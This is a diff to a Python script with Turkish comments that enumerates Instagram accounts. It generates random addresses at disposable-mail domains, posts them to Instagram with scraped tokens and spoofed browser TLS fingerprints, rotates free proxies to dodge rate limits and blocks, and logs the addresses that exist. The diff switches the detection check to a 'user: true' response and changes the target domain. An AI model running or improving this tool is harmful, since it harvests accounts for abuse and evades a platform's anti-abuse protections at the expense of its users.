@@ -17,7 +17,7 @@ TARGET_CYCLE_LIMIT = 360
 scanned_database = set()
 lock = Lock()
 stop_flag = False
-active_proxy = None  # O an kullanılan aktif proxy
+active_proxy = None
 
 # --- DİNAMİK TLS İMPERSONATE PROFİLLERİ ---
 IMPERSONATE_PROFILES = ["chrome119", "chrome120", "safari17_0", "edge101"]
@@ -26,7 +26,6 @@ IMPERSONATE_PROFILES = ["chrome119", "chrome120", "safari17_0", "edge101"]
 thread_local = local()
 
 def test_proxy(proxy_str):
-    """Bir proxy'nin çalışıp çalışmadığını test eder"""
     try:
         res = requests.get("https://httpbin.org/ip", proxies={"http": proxy_str, "https": proxy_str}, timeout=4)
         if res.status_code == 200:
@@ -36,9 +35,7 @@ def test_proxy(proxy_str):
     return False
 
 def get_fresh_working_proxy():
-    """Web'den proxy toplar ve çalışan ilk proxy'yi bulup döner"""
     print("\n🔍 [PROXY ROTASYON] Web'den taze ve canlı proxy taranıyor...")
-    
     for _ in range(15):
         try:
             p = FreeProxy(https=True).get()
@@ -47,7 +44,6 @@ def get_fresh_working_proxy():
                 return p
         except Exception:
             pass
-            
     print("⚠️ Anlık canlı proxy bulunamadı, tekrar deneniyor...")
     time.sleep(2)
     return get_fresh_working_proxy()
@@ -81,7 +77,6 @@ def get_session():
             lsd_match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', home_res.text)
             thread_local.lsd_token = lsd_match.group(1) if lsd_match else "default_lsd"
         except Exception as e:
-            print(f"⚠️ [OTURUM UYARI] Ana sayfa token'ları alınamadı: {e}")
             thread_local.csrftoken = ""
             thread_local.lsd_token = "default_lsd"
             
@@ -143,25 +138,21 @@ def auditor_worker(username, target_domain):
 
         time.sleep(random.uniform(0.3, 0.9))
         
-        # --- DEBUG LOGLAMA ---
         print(f"📡 [İSTEK] Proxy: {active_proxy} | Hedef: {full_email}")
-        
         res = session.post(url, headers=headers, data=data, timeout=15)
-        
-        print(f"📥 [YANIT] Status Code: {res.status_code} | Raw İçerik (İlk 150 kr): {res.text[:150]}")
+        print(f"📥 [YANIT] Status Code: {res.status_code} | Raw İçerik: {res.text[:150]}")
         
         try:
             res_json = res.json()
         except:
             res_json = {}
-            print(f"⚠️ [UYARI] {full_email} için dönen yanıt JSON formatında değil!")
 
         msg = str(res_json.get("message", ""))
         error_type = str(res_json.get("error_type", ""))
         status_code = res.status_code
         
-        # Engel veya hata durumları
-        if status_code not in (200, 400) or status_code in (403, 429) or "please wait" in msg.lower() or "limit" in msg.lower() or "feedback_required" in msg.lower():
+        # Engel veya rate-limit kontrolü
+        if status_code in (403, 429) or "please wait" in msg.lower() or "limit" in msg.lower() or "feedback_required" in msg.lower():
             with lock:
                 if not stop_flag:
                     stop_flag = True
@@ -169,7 +160,8 @@ def auditor_worker(username, target_domain):
             return True, username
 
         with lock:
-            if status_code == 400 and error_type == "UserInvalidCredentials":
+            # 📌 YENİ GÜNCELLENEN KONTROL: Instagram 'user: true' döndürdüğünde hesap mevcuttur!
+            if res_json.get("user") is True:
                 print(f"🟢 [HESAP BULUNDU] {full_email}")
                 with open(INPUT_FILE, "a", encoding="utf-8") as f:
                     f.write(f"{full_email}\n")
@@ -201,12 +193,12 @@ def auditor_worker(username, target_domain):
 
 def main():
     global stop_flag
-    print("\n--- INSTAGRAM TARAMA MODÜLÜ (DEBUG MODU & OTOMATİK PROXY ROTASYONU) ---")
+    print("\n--- INSTAGRAM TARAMA MODÜLÜ (GÜNCELLENMİŞ HESAP YAKALAMA) ---")
     
-    target_domain = "mailnesia.com"
+    target_domain = "telegmail.com"
     prefix = ""
     suffix = ""
-    random_len = 4
+    random_len = 5
 
     while True:
         if not os.path.exists(INPUT_FILE):
@@ -215,7 +207,7 @@ def main():
 
         stop_flag = False
         instagram_scanned_in_cycle = 0
-        print(f"\n🔎 Tarama başlatıldı... (Her {TARGET_CYCLE_LIMIT} sorguda veya proxy hatasında yeni IP'ye geçilecek)")
+        print(f"\n🔎 Tarama başlatıldı...")
 
         while not stop_flag and instagram_scanned_in_cycle < TARGET_CYCLE_LIMIT:
             found_users = []
@@ -238,7 +230,7 @@ def main():
                     with lock:
                         batch_tested.append(scanned_u)
 
-            with ThreadPoolExecutor(max_workers=3) as executor: # Test amaçlı worker sayısı dengelendi
+            with ThreadPoolExecutor(max_workers=3) as executor:
                 executor.map(run_worker, found_users)
 
             if batch_tested:
@@ -255,7 +247,7 @@ def main():
                 rotate_proxy_on_error("Hata/Engel Nedeniyle;")
 
         if instagram_scanned_in_cycle >= TARGET_CYCLE_LIMIT:
-            print(f"\n🎯 {TARGET_CYCLE_LIMIT} sorgu sınırına ulaşıldı! Güvenlik için yeni proxy'ye geçiliyor...")
+            print(f"\n🎯 Limit doldu! Yeni proxy'ye geçiliyor...")
             rotate_proxy_on_error("Sorgu Limiti Dolduğu İçin;")
 
         print(f"\n🔄 Döngü yenileniyor...\n" + "="*40)
